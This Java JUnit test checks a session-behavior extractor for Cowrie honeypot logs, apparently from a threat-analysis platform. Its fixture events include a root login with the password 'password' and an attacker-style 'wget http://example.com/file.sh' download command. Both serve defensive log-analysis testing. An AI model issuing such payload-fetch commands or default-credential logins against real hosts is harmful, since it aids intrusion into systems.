package users.rishik.threatPlatform.attack;

import org.junit.jupiter.api.Test;
import users.rishik.threatPlatform.attack.dto.RawCowrieEvent;
import users.rishik.threatPlatform.attack.dto.SessionBehavior;
import users.rishik.threatPlatform.attack.service.SessionBehaviorExtractor;

import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

class SessionBehaviorExtractorTest {

    private final SessionBehaviorExtractor extractor =
            new SessionBehaviorExtractor();

    @Test
    void shouldExtractBehaviorFromSessionEvents() {

        RawCowrieEvent command = new RawCowrieEvent(
                "2025-06-27 23:09:36.774454", // ts
                null,                          // srcPort
                null,                          // dstIp
                null,                          // dstPort
                "cowrie.command.input",        // eventid
                "session-1",                   // session
                "sensor-1",                   // sensor
                1,                             // group
                null,                          // username
                null,                          // password
                "wget http://example.com/file.sh", // input
                null,                          // message
                "http://example.com/file.sh",  // url
                null,                          // protocol
                null,                          // hassh
                null,                          // hasshAlgorithms
                null,                          // fingerprint
                null,                          // filename
                null,                          // destfile
                null,                          // outfile
                null,                          // shasum
                null,                          // size
                null,                          // duration
                null,                          // version
                "source-1",                    // srcIp
                "honeypot-1"                    // honeypotIp
        );

        RawCowrieEvent login = new RawCowrieEvent(
                "2025-06-27 23:09:31.604633", // ts
                null,                          // srcPort
                null,                          // dstIp
                null,                          // dstPort
                "cowrie.login.success",       // eventid
                "session-1",                   // session
                "sensor-1",                   // sensor
                1,                             // group
                "root",                        // username
                "password",                    // password
                null,                          // input
                "login succeeded",             // message
                null,                          // url
                null,                          // protocol
                "hassh-123",                  // hassh
                null,                          // hasshAlgorithms
                null,                          // fingerprint
                null,                          // filename
                null,                          // destfile
                null,                          // outfile
                null,                          // shasum
                null,                          // size
                null,                          // duration
                null,                          // version
                "source-1",                    // srcIp
                "honeypot-1"                   // honeypotIp
        );

        SessionBehavior behavior =
                extractor.extract(List.of(command, login));

        assertEquals("session-1", behavior.sessionId());
        assertEquals("source-1", behavior.sourceIp());
        assertEquals("honeypot-1", behavior.honeypotIp());

        // Events should be chronologically ordered
        assertEquals(
                List.of(
                        "cowrie.login.success",
                        "cowrie.command.input"
                ),
                behavior.eventSequence()
        );

        assertEquals(
                List.of("wget http://example.com/file.sh"),
                behavior.commandSequence()
        );

        assertTrue(behavior.loginSuccess());
        assertFalse(behavior.loginFailure());

        assertEquals("hassh-123", behavior.hassh());
    }
}